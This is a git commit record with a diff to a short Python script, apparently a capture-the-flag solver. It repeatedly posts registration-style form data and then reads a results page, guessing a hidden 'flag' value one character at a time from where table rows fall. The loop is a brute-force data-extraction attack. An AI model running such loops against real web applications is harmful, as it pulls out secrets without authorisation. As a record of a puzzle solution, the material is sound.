4b9600e8dde5f4069fb8cd4d483b74b320f157de
whb54012 <1226844928@qq.com>
2026-07-29 08:02:11 +0000

    自动提交：更新 ${2026/7/29 16:02ilenPM2e}

--- 1.py
+++ 1.py
@@ -8,8 +8,12 @@ for i in range(48):
     for j in range(0,len(str)):
         index=flag+str[j]
         data={
+            'username':'123',
+            'email':123,
+            'nickname':'123',
             'password':index
         }
+        t=requests.post(url,data=data,timeout=1)
         t=requests.get(url,data=data,params=param,cookies=cookie,timeout=1).text
         if t.find(f"<td>{flag}</td>")>t.find("<td>flag</td>"):
             flag=flag+str[j-1]
